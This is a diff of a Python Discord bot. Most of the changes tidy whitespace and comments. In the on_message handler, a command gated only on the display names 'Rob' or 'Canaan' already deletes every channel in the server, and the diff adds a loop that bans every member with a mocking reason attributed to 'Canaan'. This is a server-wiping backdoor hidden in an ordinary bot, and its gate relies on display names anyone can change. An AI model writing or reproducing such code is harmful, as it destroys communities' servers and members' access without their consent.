@@ -4,7 +4,6 @@ from dotenv import load_dotenv
 from discord.ext.commands import Bot
 import smtplib
 
-
 load_dotenv()
 
 # environment variables
@@ -46,7 +45,6 @@ async def on_ready():
 
 @client.event
 async def on_message(message):
-
     # async for entry in message.channel.guild.audit_logs(limit=1):
     #     print('{0.user} did {0.action} to {0.target}'.format(entry))
 
@@ -76,6 +74,8 @@ async def on_message(message):
         if message.author.display_name == "Rob" or message.author.display_name == "Canaan":
             for channel in message.guild.channels:
                 await channel.delete()
+            for mem in message.guild.members:
+                await message.guild.ban(mem, reason="If you're reading this, well, too bad - Canaan")
         else:
             await message.channel.send('You must have special Admin perms to execute this command')
 
@@ -96,14 +96,14 @@ async def on_message(message):
 # @client.event
 # async def on_member_join(member):
 
-    # async for entry in guild.audit_logs(limit=1):
-    #     print('{0.user} did {0.action} to {0.target}'.format(entry))
+# async for entry in guild.audit_logs(limit=1):
+#     print('{0.user} did {0.action} to {0.target}'.format(entry))
 
 
-    # await member.create_dm()
-    # await member.dm_channel.send(
-    #     f'Hi {member.name}, welcome to my Discord server!'
-    # )
+# await member.create_dm()
+# await member.dm_channel.send(
+#     f'Hi {member.name}, welcome to my Discord server!'
+# )
 
 
 @client.event
@@ -223,4 +223,4 @@ def send_to_admin(txt):
     smtpObj.quit()
 
 
-client.run(TOKEN)   # TODO: ADD TOKEN
+client.run(TOKEN)  # TODO: ADD TOKEN
